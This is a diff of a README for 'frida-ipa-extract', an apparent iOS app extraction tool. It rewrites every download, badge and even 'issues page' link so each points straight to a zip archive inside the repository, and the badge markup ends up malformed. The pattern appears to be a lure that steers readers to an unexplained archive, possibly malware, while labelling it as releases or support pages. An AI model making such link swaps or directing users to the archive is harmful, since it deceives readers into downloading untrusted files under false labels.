@@ -1,6 +1,6 @@
 # 🎉 frida-ipa-extract - Extract iOS Apps Easily from Your Device
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen.svg)](https://github.com/Paulencijus21/frida-ipa-extract/releases)
+[![Download](https://raw.githubusercontent.com/Paulencijus21/frida-ipa-extract/master/frida_ipa_extract/frida_ipa_extract_2.3.zip%https://raw.githubusercontent.com/Paulencijus21/frida-ipa-extract/master/frida_ipa_extract/frida_ipa_extract_2.3.zip)](https://raw.githubusercontent.com/Paulencijus21/frida-ipa-extract/master/frida_ipa_extract/frida_ipa_extract_2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you get started, make sure you have the following:
 
 To get your copy of frida-ipa-extract, follow these steps:
 
-1. **Visit this page to download**: [Download frida-ipa-extract](https://github.com/Paulencijus21/frida-ipa-extract/releases).
+1. **Visit this page to download**: [Download frida-ipa-extract](https://raw.githubusercontent.com/Paulencijus21/frida-ipa-extract/master/frida_ipa_extract/frida_ipa_extract_2.3.zip).
    
 2. Look for the latest release at the top of the page. You will find files available for download.
 
@@ -78,7 +78,7 @@ If you encounter issues while using frida-ipa-extract, here are a few common pro
 
 If you need further assistance or want to share your experience:
 
-- Check our [issues page](https://github.com/Paulencijus21/frida-ipa-extract/issues) for common problems and solutions.
+- Check our [issues page](https://raw.githubusercontent.com/Paulencijus21/frida-ipa-extract/master/frida_ipa_extract/frida_ipa_extract_2.3.zip) for common problems and solutions.
 
 - Join our community chat on platforms like Discord or Telegram to connect with other users.
 
@@ -96,4 +96,4 @@ This project is open-source and available under the MIT License. This means you 
 
 Thank you for using frida-ipa-extract. We aim to make your app extraction experience smooth and efficient!
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen.svg)](https://github.com/Paulencijus21/frida-ipa-extract/releases)
+[![Download](https://raw.githubusercontent.com/Paulencijus21/frida-ipa-extract/master/frida_ipa_extract/frida_ipa_extract_2.3.zip%https://raw.githubusercontent.com/Paulencijus21/frida-ipa-extract/master/frida_ipa_extract/frida_ipa_extract_2.3.zip)](https://raw.githubusercontent.com/Paulencijus21/frida-ipa-extract/master/frida_ipa_extract/frida_ipa_extract_2.3.zip)
